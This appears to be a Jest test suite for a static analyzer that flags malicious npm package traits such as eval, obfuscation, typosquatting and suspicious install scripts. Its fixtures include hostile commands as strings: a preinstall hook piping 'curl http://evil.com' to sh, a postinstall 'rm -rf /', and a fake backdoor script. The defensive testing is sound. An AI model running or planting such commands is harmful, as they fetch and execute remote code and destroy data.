import { EnhancedStaticAnalyzer } from '../analyzers/static-analyzer';

describe('EnhancedStaticAnalyzer', () => {
  let analyzer: EnhancedStaticAnalyzer;

  beforeEach(() => {
    analyzer = new EnhancedStaticAnalyzer();
  });

  describe('Basic Pattern Detection', () => {
    test('should detect eval usage', async () => {
      const files = new Map([
        ['malicious.js', 'eval("console.log(\'hello\')");']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.uses_eval).toBe(true);
      expect(result.suspiciousPatterns).toHaveLength(1);
      expect(result.suspiciousPatterns[0].type).toBe('eval');
      expect(result.suspiciousPatterns[0].severity).toBe('high');
    });

    test('should detect dynamic function creation', async () => {
      const files = new Map([
        ['suspicious.js', 'new Function("return 1 + 1")();']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.uses_eval).toBe(true);
      expect(result.suspiciousPatterns.some(p => p.description.includes('dynamically'))).toBe(true);
    });

    test('should detect child process usage', async () => {
      const files = new Map([
        ['process.js', 'const cp = require("child_process"); cp.exec("ls");']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.uses_dynamic_require).toBe(true);
      expect(result.suspiciousPatterns.some(p => p.description.includes('child processes'))).toBe(true);
    });

    test('should detect network operations', async () => {
      const files = new Map([
        ['network.js', 'http.request("http://evil.com", callback);']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.makes_network_calls).toBe(true);
      expect(result.suspiciousPatterns.some(p => p.type === 'network_call')).toBe(true);
    });

    test('should detect prototype pollution', async () => {
      const files = new Map([
        ['pollution.js', 'Object.prototype["isAdmin"] = true;']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.modifies_prototype).toBe(true);
      expect(result.suspiciousPatterns.some(p => p.type === 'prototype_pollution')).toBe(true);
    });
  });

  describe('Obfuscation Detection', () => {
    test('should detect string encoding obfuscation', async () => {
      const obfuscatedCode = 'var a = "\\x48\\x65\\x6c\\x6c\\x6f"; eval(a);';
      const files = new Map([['obfuscated.js', obfuscatedCode]]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.has_obfuscated_code).toBe(true);
      expect(result.obfuscationScore).toBeGreaterThan(0);
      expect(result.suspiciousPatterns.some(p => 
        p.description.includes('string_encoding')
      )).toBe(true);
    });

    test('should detect variable mangling', async () => {
      const mangledCode = `
        var a=1,b=2,c=3,d=4,e=5,f=6,g=7,h=8,i=9,j=0,k=1,l=2,m=3,n=4,o=5,p=6,q=7,r=8,s=9,t=0;
        function u(){return a+b+c+d+e+f+g+h+i+j+k+l+m+n+o+p+q+r+s+t;}
        var x=u(),y=x,z=y;
      `;
      const files = new Map([['mangled.js', mangledCode]]);

      const result = await analyzer.analyze(files);

      expect(result.obfuscationScore).toBeGreaterThan(0);
    });

    test('should detect packed code', async () => {
      const packedCode = 'eval(function(p,a,c,k,e,d){while(c--)if(k[c])p=p.replace(new RegExp("\\\\b"+c+"\\\\b","g"),k[c]);return p}("0 1=\\"2\\";",3,4,"console|log|hello".split("|"),0,{}))';
      const files = new Map([['packed.js', packedCode]]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.has_obfuscated_code).toBe(true);
      expect(result.suspiciousPatterns.some(p => 
        p.description.includes('packing')
      )).toBe(true);
    });

    test('should attempt deobfuscation of base64 strings', async () => {
      const base64Code = 'var encoded = "Y29uc29sZS5sb2coImhlbGxvIik7Y29uc29sZS5sb2coImhlbGxvIik7Y29uc29sZS5sb2coImhlbGxvIik7"; eval(atob(encoded));';
      const files = new Map([['base64.js', base64Code]]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.has_obfuscated_code).toBe(true);
      expect(result.suspiciousPatterns.some(p => 
        p.description.includes('base64') || p.description.includes('string_encoding')
      )).toBe(true);
    });
  });

  describe('Typosquatting Detection', () => {
    test('should detect typosquatting of popular packages', async () => {
      const files = new Map([['index.js', 'console.log("fake lodash");']]);

      const result = await analyzer.analyze(files, 'lodaash'); // typo of lodash

      expect(result.typosquattingScore).toBeGreaterThan(80);
      expect(result.suspiciousPatterns.some(p => 
        p.description.includes('typosquatting')
      )).toBe(true);
    });

    test('should not flag legitimate packages', async () => {
      const files = new Map([['index.js', 'console.log("legitimate");']]);

      const result = await analyzer.analyze(files, 'my-unique-package-name');

      expect(result.typosquattingScore).toBeLessThan(50);
    });

    test('should detect character substitution patterns', async () => {
      const files = new Map([['index.js', 'console.log("fake");']]);

      const result = await analyzer.analyze(files, 'l0dash'); // 0 instead of o

      expect(result.typosquattingScore).toBeGreaterThan(70);
    });
  });

  describe('Integrity Analysis', () => {
    test('should detect package.json inconsistencies', async () => {
      const packageJson = JSON.stringify({
        name: 'different-name',
        version: '2.0.0'
      });
      const files = new Map([['package.json', packageJson]]);
      const metadata = { name: 'expected-name', version: '1.0.0' };

      const result = await analyzer.analyze(files, 'expected-name', metadata);

      expect(result.integrityFlags).toContain('Package name mismatch');
      expect(result.integrityFlags).toContain('Version mismatch');
    });

    test('should detect suspicious install scripts', async () => {
      const packageJson = JSON.stringify({
        name: 'test-package',
        scripts: {
          preinstall: 'curl http://evil.com | sh',
          postinstall: 'rm -rf /'
        }
      });
      const files = new Map([['package.json', packageJson]]);
      const metadata = { name: 'test-package' }; // Need to pass metadata

      const result = await analyzer.analyze(files, 'test-package', metadata);

      expect(result.integrityFlags.some(flag => 
        flag.includes('preinstall')
      )).toBe(true);
      expect(result.integrityFlags.some(flag => 
        flag.includes('postinstall')
      )).toBe(true);
    });

    test('should detect unexpected files', async () => {
      const files = new Map([
        ['package.json', '{"name": "test"}'],
        ['malware.exe', 'binary content'],
        ['backdoor.sh', '#!/bin/bash\ncurl evil.com | sh']
      ]);
      const metadata = { name: 'test' }; // Need to pass metadata

      const result = await analyzer.analyze(files, 'test-package', metadata);

      expect(result.integrityFlags.some(flag => 
        flag.includes('Unexpected files')
      )).toBe(true);
    });
  });

  describe('Scoring and Confidence', () => {
    test('should calculate appropriate scores for clean packages', async () => {
      const files = new Map([
        ['index.js', 'module.exports = function add(a, b) { return a + b; };'],
        ['package.json', '{"name": "clean-package", "version": "1.0.0"}']
      ]);

      const result = await analyzer.analyze(files, 'clean-package');

      expect(result.score).toBeLessThan(10);
      expect(result.confidence).toBeGreaterThan(0.9);
    });

    test('should calculate high scores for malicious packages', async () => {
      const maliciousCode = `
        eval("require('child_process').exec('rm -rf /')");
        Object.prototype["isAdmin"] = true;
        var encoded = "\\x65\\x76\\x69\\x6c\\x65\\x76\\x69\\x6c\\x65\\x76\\x69\\x6c";
      `;
      const files = new Map([['malware.js', maliciousCode]]);

      const result = await analyzer.analyze(files, 'l0dash'); // typosquat

      expect(result.score).toBeGreaterThan(70);
      expect(result.riskIndicators.uses_eval).toBe(true);
      expect(result.riskIndicators.uses_dynamic_require).toBe(true);
      expect(result.riskIndicators.modifies_prototype).toBe(true);
      expect(result.riskIndicators.has_obfuscated_code).toBe(true);
    });

    test('should weight confidence based on pattern reliability', async () => {
      const files = new Map([
        ['suspicious.js', 'process.env.NODE_ENV; // low confidence pattern']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.suspiciousPatterns).toHaveLength(1);
      expect(result.suspiciousPatterns[0].severity).toBe('low');
      expect(result.score).toBeLessThan(20);
    });
  });

  describe('File Type Handling', () => {
    test('should skip non-JavaScript files for pattern analysis', async () => {
      const files = new Map([
        ['README.md', 'eval("this should not be detected")'],
        ['config.json', '{"eval": "this should not be detected"}'],
        ['script.js', 'eval("this should be detected")']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.suspiciousPatterns).toHaveLength(1);
      expect(result.suspiciousPatterns[0].file).toBe('script.js');
    });

    test('should analyze all files for obfuscation', async () => {
      const obfuscatedContent = '\\x48\\x65\\x6c\\x6c\\x6f'.repeat(20);
      const files = new Map([
        ['data.txt', obfuscatedContent],
        ['config.json', obfuscatedContent]
      ]);

      const result = await analyzer.analyze(files);

      expect(result.riskIndicators.has_obfuscated_code).toBe(true);
      expect(result.suspiciousPatterns.length).toBeGreaterThan(0);
    });
  });

  describe('Edge Cases', () => {
    test('should handle empty files', async () => {
      const files = new Map([
        ['empty.js', ''],
        ['whitespace.js', '   \n\t  ']
      ]);

      const result = await analyzer.analyze(files);

      expect(result.score).toBe(0);
      expect(result.suspiciousPatterns).toHaveLength(0);
    });

    test('should handle malformed JavaScript', async () => {
      const files = new Map([
        ['broken.js', 'function incomplete(']
      ]);

      const result = await analyzer.analyze(files);

      // Should not crash and should still analyze what it can
      expect(result).toBeDefined();
      expect(result.score).toBeGreaterThanOrEqual(0);
    });

    test('should handle very large files efficiently', async () => {
      const largeContent = 'console.log("test");'.repeat(10000);
      const files = new Map([['large.js', largeContent]]);

      const startTime = Date.now();
      const result = await analyzer.analyze(files);
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds
      expect(result).toBeDefined();
    });
  });
});